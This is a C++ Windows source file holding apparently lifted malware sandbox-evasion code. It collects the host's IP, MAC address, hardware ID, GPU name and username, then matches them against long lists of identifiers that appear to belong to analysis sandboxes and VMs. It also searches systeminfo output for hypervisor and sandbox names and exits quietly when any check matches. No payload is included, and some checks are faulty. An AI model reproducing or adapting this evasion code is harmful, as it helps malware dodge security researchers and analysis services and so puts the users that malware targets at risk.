#include <iostream>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <regex>
#include <Windows.h>
#include <iphlpapi.h>
#include <sddl.h>
#include <urlmon.h>
#include <array>
#include <iomanip> // Для std::setw и std::setfill
#include <memory>   // Для std::unique_ptr
#include <stdexcept> // Для std::runtime_error

#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "urlmon.lib")

std::vector<std::string> blacklisted_ips = {"10.200.169.204", "104.198.155.173", "104.200.151.35", "109.145.173.169", "109.226.37.172", "109.74.154.90", "109.74.154.91", "109.74.154.92", "140.228.21.36", "149.88.111.79", "154.61.71.50", "154.61.71.51", "172.105.89.202", "174.7.32.199", "176.63.4.179", "178.239.165.70", "181.214.153.11", "185.220.101.107", "185.44.176.125", "185.44.176.135", "185.44.176.143", "185.44.176.70", "185.44.176.85", "185.44.177.132", "185.44.177.133", "185.44.177.138", "185.44.177.193", "185.44.177.254", "185.44.177.55", "188.105.165.80", "188.105.71.44", "188.105.91.116", "188.105.91.143", "188.105.91.173", "191.101.209.39", "191.96.150.218", "192.211.110.74", "192.40.57.234", "192.87.28.103", "193.128.114.45", "193.225.193.201", "193.226.177.40", "194.110.13.70", "194.154.78.144", "194.154.78.152", "194.154.78.160", "194.154.78.169", "194.154.78.179", "194.154.78.210", "194.154.78.227", "194.154.78.230", "194.154.78.235", "194.154.78.77", "194.154.78.91", "194.186.142.178", "194.186.142.180", "194.186.142.183", "194.186.142.195", "194.186.142.204", "194.186.142.214", "194.186.142.236", "194.186.142.246", "195.181.175.103", "195.181.175.105", "195.228.105.39", "195.239.51.3", "195.239.51.42", "195.239.51.46", "195.239.51.59", "195.239.51.65", "195.239.51.73", "195.239.51.80", "195.239.51.89", "195.68.142.20", "195.68.142.3", "195.74.76.222", "2.94.86.134", "20.114.22.115", "20.99.160.173", "204.101.161.31", "204.101.161.32", "207.102.138.83", "207.102.138.93", "208.78.41.115", "209.127.189.74", "212.119.227.136", "212.119.227.151", "212.119.227.167", "212.119.227.179", "212.119.227.184", "212.41.6.23", "213.33.142.50", "213.33.190.109", "213.33.190.118", "213.33.190.171", "213.33.190.22", "213.33.190.227", "213.33.190.242", "213.33.190.35", "213.33.190.42", "213.33.190.46", "213.33.190.69", "213.33.190.74", "23.128.248.46", "34.105.0.27", "34.105.183.68", "34.105.72.241", "34.138.255.104", "34.138.96.23", "34.141.146.114", "34.141.245.25", "34.142.74.220", "34.145.195.58", "34.145.89.174", "34.17.49.70", "34.17.55.59", "34.253.248.228", "34.73.60.153", "34.83.46.130", "34.85.243.241", "34.85.253.170", "35.186.33.204", "35.192.93.107", "35.197.127.11", "35.199.6.13", "35.229.69.227", "35.237.47.12", "38.154.242.210", "45.8.148.171", "5.45.98.162", "52.250.30.131", "64.124.12.162", "67.218.111.202", "78.139.8.50", "79.104.209.109", "79.104.209.168", "79.104.209.172", "79.104.209.221", "79.104.209.231", "79.104.209.24", "79.104.209.249", "79.104.209.33", "79.104.209.36", "79.104.209.66", "80.211.0.97", "81.181.60.60", "84.147.54.113", "84.147.54.61", "84.147.56.249", "84.147.60.41", "84.147.60.52", "84.147.61.28", "84.147.62.12", "84.147.63.171", "84.147.63.236", "84.57.183.108", "84.57.200.69", "87.166.48.65", "87.166.50.1", "87.166.50.213", "87.166.51.209", "88.132.225.100", "88.132.226.203", "88.132.227.238", "88.132.231.71", "88.153.199.169", "88.64.35.141", "88.64.36.101", "88.66.107.75", "88.66.111.235", "88.66.8.175", "88.67.131.90", "88.67.134.91", "88.86.117.130", "89.208.29.106", "89.208.29.108", "89.208.29.140", "89.208.29.149", "89.208.29.63", "89.208.29.64", "89.208.29.95", "89.208.29.96", "89.208.29.97", "89.208.29.98", "92.211.109.160", "92.211.192.144", "92.211.52.62", "92.211.55.199", "93.216.75.209", "95.25.204.90", "95.25.71.112", "95.25.71.12", "95.25.71.5", "95.25.71.64", "95.25.71.65", "95.25.71.70", "95.25.71.80", "95.25.71.86", "95.25.71.87", "95.25.71.89", "95.25.71.92", "95.25.81.24", "None"};
std::vector<std::string> blacklisted_macs = {"00:15:5d:00:07:34", "00:e0:4c:b8:7a:58", "00:0c:29:2c:c1:21", "00:25:90:65:39:e4", "c8:9f:1d:b6:58:e4", "00:25:90:36:65:0c", "00:15:5d:00:00:f3", "2e:b8:24:4d:f7:de", "00:15:5d:13:6d:0c", "00:50:56:a0:dd:00", "00:15:5d:13:66:ca", "56:e8:92:2e:76:0d", "ac:1f:6b:d0:48:fe", "00:e0:4c:94:1f:20", "00:15:5d:00:05:d5", "00:e0:4c:4b:4a:40", "42:01:0a:8a:00:22", "00:1b:21:13:15:20", "00:15:5d:00:06:43", "00:15:5d:1e:01:c8", "00:50:56:b3:38:68", "60:02:92:3d:f1:69", "00:e0:4c:7b:7b:86", "00:e0:4c:46:cf:01", "42:85:07:f4:83:d0", "56:b0:6f:ca:0a:e7", "12:1b:9e:3c:a6:2c", "00:15:5d:00:1c:9a", "00:15:5d:00:1a:b9", "b6:ed:9d:27:f4:fa", "00:15:5d:00:01:81", "4e:79:c0:d9:af:c3", "00:15:5d:b6:e0:cc", "00:15:5d:00:02:26", "00:50:56:b3:05:b4", "1c:99:57:1c:ad:e4", "08:00:27:3a:28:73", "00:15:5d:00:00:c3", "00:50:56:a0:45:03", "12:8a:5c:2a:65:d1", "00:25:90:36:f0:3b", "00:1b:21:13:21:26", "42:01:0a:8a:00:22", "00:1b:21:13:32:51", "a6:24:aa:ae:e6:12", "08:00:27:45:13:10", "00:1b:21:13:26:44", "3c:ec:ef:43:fe:de", "d4:81:d7:ed:25:54", "00:25:90:36:65:38", "00:03:47:63:8b:de", "00:15:5d:00:05:8d", "00:0c:29:52:52:50", "00:50:56:b3:42:33", "3c:ec:ef:44:01:0c", "06:75:91:59:3e:02", "42:01:0a:8a:00:33", "ea:f6:f1:a2:33:76", "ac:1f:6b:d0:4d:98", "1e:6c:34:93:68:64", "00:50:56:a0:61:aa", "42:01:0a:96:00:22", "00:50:56:b3:21:29", "00:15:5d:00:00:b3", "96:2b:e9:43:96:76", "b4:a9:5a:b1:c6:fd", "d4:81:d7:87:05:ab", "ac:1f:6b:d0:49:86", "52:54:00:8b:a6:08", "00:0c:29:05:d8:6e", "00:23:cd:ff:94:f0", "00:e0:4c:d6:86:77", "3c:ec:ef:44:01:aa", "00:15:5d:23:4c:a3", "00:1b:21:13:33:55", "00:15:5d:00:00:a4", "16:ef:22:04:af:76", "00:15:5d:23:4c:ad", "1a:6c:62:60:3b:f4", "00:15:5d:00:00:1d", "00:50:56:a0:cd:a8", "00:50:56:b3:fa:23", "52:54:00:a0:41:92", "00:50:56:b3:f6:57", "00:e0:4c:56:42:97", "ca:4d:4b:ca:18:cc", "f6:a5:41:31:b2:78", "d6:03:e4:ab:77:8e", "00:50:56:ae:b2:b0", "00:50:56:b3:94:cb", "42:01:0a:8e:00:22", "00:50:56:b3:4c:bf", "00:50:56:b3:09:9e", "00:50:56:b3:38:88", "00:50:56:a0:d0:fa", "00:50:56:b3:91:c8", "3e:c1:fd:f1:bf:71", "00:50:56:a0:6d:86", "00:50:56:a0:af:75", "00:50:56:b3:dd:03", "c2:ee:af:fd:29:21", "00:50:56:b3:ee:e1", "00:50:56:a0:84:88", "00:1b:21:13:32:20", "3c:ec:ef:44:00:d0", "00:50:56:ae:e5:d5", "00:50:56:97:f6:c8", "52:54:00:ab:de:59", "00:50:56:b3:9e:9e", "00:50:56:a0:39:18", "32:11:4d:d0:4a:9e", "00:50:56:b3:d0:a7", "94:de:80:de:1a:35", "00:50:56:ae:5d:ea", "00:50:56:b3:14:59", "ea:02:75:3c:90:9f", "00:e0:4c:44:76:54", "ac:1f:6b:d0:4d:e4", "52:54:00:3b:78:24", "00:50:56:b3:50:de", "7e:05:a3:62:9c:4d", "52:54:00:b3:e4:71", "90:48:9a:9d:d5:24", "00:50:56:b3:3b:a6", "92:4c:a8:23:fc:2e", "5a:e2:a6:a4:44:db", "00:50:56:ae:6f:54", "42:01:0a:96:00:33", "00:50:56:97:a1:f8", "5e:86:e4:3d:0d:f6", "00:50:56:b3:ea:ee", "3e:53:81:b7:01:13", "00:50:56:97:ec:f2", "00:e0:4c:b3:5a:2a", "12:f8:87:ab:13:ec", "00:50:56:a0:38:06", "2e:62:e8:47:14:49", "00:0d:3a:d2:4f:1f", "60:02:92:66:10:79", "", "00:50:56:a0:d7:38", "be:00:e5:c5:0c:e5", "00:50:56:a0:59:10", "00:50:56:a0:06:8d", "00:e0:4c:cb:62:08", "4e:81:81:8e:22:4e"};
std::vector<std::string> blacklisted_hwids = {"7AB5C494-39F5-4941-9163-47F54D6D5016", "032E02B4-0499-05C3-0806-3C0700080009", "03DE0294-0480-05DE-1A06-350700080009", "11111111-2222-3333-4444-555555555555", "6F3CA5EC-BEC9-4A4D-8274-11168F640058", "ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548", "4C4C4544-0050-3710-8058-CAC04F59344A", "00000000-0000-0000-0000-AC1F6BD04972", "00000000-0000-0000-0000-000000000000", "5BD24D56-789F-8468-7CDC-CAA7222CC121", "49434D53-0200-9065-2500-65902500E439", "49434D53-0200-9036-2500-36902500F022", "777D84B3-88D1-451C-93E4-D235177420A7", "49434D53-0200-9036-2500-369025000C65", "B1112042-52E8-E25B-3655-6A4F54155DBF", "00000000-0000-0000-0000-AC1F6BD048FE", "EB16924B-FB6D-4FA1-8666-17B91F62FB37", "A15A930C-8251-9645-AF63-E45AD728C20C", "67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3", "C7D23342-A5D4-68A1-59AC-CF40F735B363", "63203342-0EB0-AA1A-4DF5-3FB37DBB0670", "44B94D56-65AB-DC02-86A0-98143A7423BF", "6608003F-ECE4-494E-B07E-1C4615D1D93C", "D9142042-8F51-5EFF-D5F8-EE9AE3D1602A", "49434D53-0200-9036-2500-369025003AF0", "8B4E8278-525C-7343-B825-280AEBCD3BCB", "4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27", "79AF5279-16CF-4094-9758-F88A616D81B4", "FE822042-A70C-D08B-F1D1-C207055A488F", "76122042-C286-FA81-F0A8-514CC507B250", "481E2042-A1AF-D390-CE06-A8F783B1E76A", "F3988356-32F5-4AE1-8D47-FD3B8BAFBD4C", "9961A120-E691-4FFE-B67B-F0E4115D5919"};
std::vector<std::string> blacklisted_gpus = {"2G6C7Z61", "2RO_8UVU", "2SN538K4", "5KBK41_L", "5LXPA8ES", "5PECN6L1", "5RPFT3HZ", "6BOS4O7U", "6BZP2Y2_", "6F44ADR7", "6MPA93", "7229H9G9", "74ZZCY7A", "7TB9G6P7", "84KD1KSK", "8NYGK3FL", "8Y3BSXKG", "9SF72FG7", "9Z77DN4T", "_G31E46N", "_PHLNYGR", "_T9W5LHO", "AFRBR6TC", "AMD Radeon HD 8650G", "ASPEED Graphics Family(WDDM)", "B69OHLB2", "BDMD4C14", "CSUZOOXW", "CWTM14GS", "D6XUO1XB", "DE92L2UN", "DFXWTBCX", "ET1BXXAK", "F1K792VR", "FENYSTD", "H1_SDVLF", "H_EDEUEK", "HASZN_3F", "HKWURZU9", "HP8WD3MX", "HV61HV5F", "Intel(R) HD Graphics 4600", "Intel(R) UHD Graphics 630", "K9SC88UK", "KBBFOHZN", "KEZ744W", "KOD68ZH1", "KW5PTYKC", "L19KFFGO", "LD8LLLOD", "M5RGU9RY", "MDF5Z6ZO", "Microsoft Basic Display Adapter", "Microsoft Hyper-V Video", "Microsoft Remote Display Adapter", "MKVW6M6X", "MTSUP2DX", "MYNP2R7E", "NVIDIA GeForce 840M", "NVIDIA GeForce 9400M", "NVIDIA GeForce 9500 GT (Microsoft Corporation - WDDM v1.1)", "O25VL9P2", "O597EOTS", "OEFUG1_W", "OOUT3ENP", "OYVM_U6G", "P9T_AU3X", "PC1ESCG3", "PE86ZT", "R69XK_H3", "Radeon (TM) RX 580 Graphics", "S6DZU3GA", "Standard VGA Graphics Adapter", "Стандартный VGA графический адаптер", "THUVF23F9", "TTXRONXD", "UKBEHH_S", "Virtual Desktop Monitor", "VirtualBox Graphics Adapter", "VirtualBox Graphics Adapter (WDDM)", "VM64TTFX", "VMware SVGA 3D", "VO5V631D", "W1TO6L3T", "W29FK1O1", "W2RTB1KRM", "WKMZ6LN2", "X4R9RZ5L", "X5ZW15TV", "XMX85CAL", "YANBV9OY", "YNVLCUKZ", "YVK4794D", "Z2P35N", "Z2P8CT__", "ZN_TF2UZ", "ZP62XCAP", "ZSHE4HM"};
std::vector<std::string> blacklistUsers = {"WDAGUtilityAccount", "3W1GJT", "QZSBJVWM", "5ISYH9SH", "Abby", "hmarc", "patex", "RDhJ0CNFevzX", "kEecfMwgj", "Frank", "8Nl0ColNQ5bq", "Lisa", "John", "george", "PxmdUOpVyx", "8VizSM", "w0fjuOVmCcP5A", "lmVwjj9b", "PqONjHVwexsS", "3u2v9m8", "Julia", "HEUeRzl", "fred", "server", "BvJChRPnsxn", "Harry Johnson", "SqgFOf3G", "Lucas", "mike", "PateX", "h7dk1xPr", "Louise", "User01", "test", "RGzcBUyrznReg"};

std::string executeCommand(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;

    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");

    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

std::string getMACAddress() {
    IP_ADAPTER_INFO* pAdapterInfo = nullptr;
    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }

    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR) {
        std::stringstream macAddress;
        for (UINT i = 0; i < pAdapterInfo->AddressLength; i++) {
            macAddress << std::hex << std::setw(2) << std::setfill('0') << (int)pAdapterInfo->Address[i];
            if (i != pAdapterInfo->AddressLength - 1) macAddress << ":";
        }
        free(pAdapterInfo);
        return macAddress.str();
    }
    free(pAdapterInfo);
    return "Unknown MAC";
}

std::string getHWID() {
    std::string hwid = executeCommand("wmic csproduct get uuid");
    std::regex regex("\\s+");
    std::string cleaned_hwid = std::regex_replace(hwid, regex, " ");
    return cleaned_hwid.substr(cleaned_hwid.find_first_not_of(" "), cleaned_hwid.find_last_not_of(" ") + 1);
}

std::string getGPUInfo() {
    std::string gpu_info = executeCommand("wmic path win32_videocontroller get caption");
    std::istringstream stream(gpu_info);
    std::string line;
    std::getline(stream, line);
    return line;
}

std::string getIPAddress() {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    struct hostent* host_entry = gethostbyname(hostname);
    if (host_entry != nullptr) {
        struct in_addr addr;
        memcpy(&addr, host_entry->h_addr_list[0], sizeof(struct in_addr));
        return inet_ntoa(addr);
    }
    return "Unknown IP";
}

std::string get_username() {
    char username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size)) {
        return std::string(username);
    }
    return "";
}

bool detectEnvironment() {
    std::string system_info = executeCommand("systeminfo");
    std::vector<std::string> vm_indicators = {"VBOX", "VIRTUALBOX", "VMWARE", "XEN", "QEMU", "VIRTUAL", "HYPERVISOR", "SBOX", "SANDBOX", "CWSANDBOX"};
    std::vector<std::string> analysis_indicators = {"virustotal", "hybrid-analysis", "cuckoo", "malwr", "any.run", "reverse.it", "joe sandbox", "threatgrid", "cape sandbox", "totalhash", "intezer"};

    for (const auto& indicator : vm_indicators) {
        if (system_info.find(indicator) != std::string::npos) return true;
    }
    
    for (const auto& indicator : analysis_indicators) {
        if (system_info.find(indicator) != std::string::npos) return true;
    }

    HRESULT hr = URLDownloadToFileA(NULL, "https://www.virustotal.com/", NULL, 0, NULL);
    return hr == S_OK;
}

int main() {
    std::string ip_address = getIPAddress();
    std::string mac_address = getMACAddress();
    std::string hwid = getHWID();
    std::string gpu = getGPUInfo();
    std::string username = get_username();

    if (detectEnvironment() || 
        std::find(blacklisted_ips.begin(), blacklisted_ips.end(), ip_address) != blacklisted_ips.end() || 
        std::find(blacklisted_macs.begin(), blacklisted_macs.end(), mac_address) != blacklisted_macs.end() || 
        std::find(blacklisted_hwids.begin(), blacklisted_hwids.end(), hwid) != blacklisted_hwids.end() || 
        std::find(blacklisted_gpus.begin(), blacklisted_gpus.end(), gpu) != blacklisted_gpus.end() || 
        std::find(blacklistUsers.begin(), blacklistUsers.end(), username) != blacklistUsers.end()) 
    {
        return 0;
    }

    return 1;
}
